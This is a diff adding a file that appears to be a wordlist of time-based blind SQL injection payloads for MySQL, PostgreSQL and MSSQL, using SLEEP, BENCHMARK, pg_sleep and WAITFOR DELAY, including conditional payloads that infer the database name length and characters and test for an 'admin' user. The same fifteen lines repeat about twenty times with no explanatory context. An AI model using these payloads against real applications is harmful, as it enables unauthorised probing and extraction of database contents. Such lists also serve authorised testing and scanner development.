@@ -1,0 +1,300 @@
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+' AND IF(1=1, SLEEP(5), 0)--
+' AND IF(1=2, SLEEP(5), 0)--
+' OR IF(1=1, SLEEP(5), 0)--
+' OR IF(1=2, SLEEP(5), 0)--
+' AND BENCHMARK(5000000,MD5('test'))--
+' OR BENCHMARK(5000000,MD5('test'))--
+' AND pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '00:00:05'--
+' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--
+' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--
+' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--
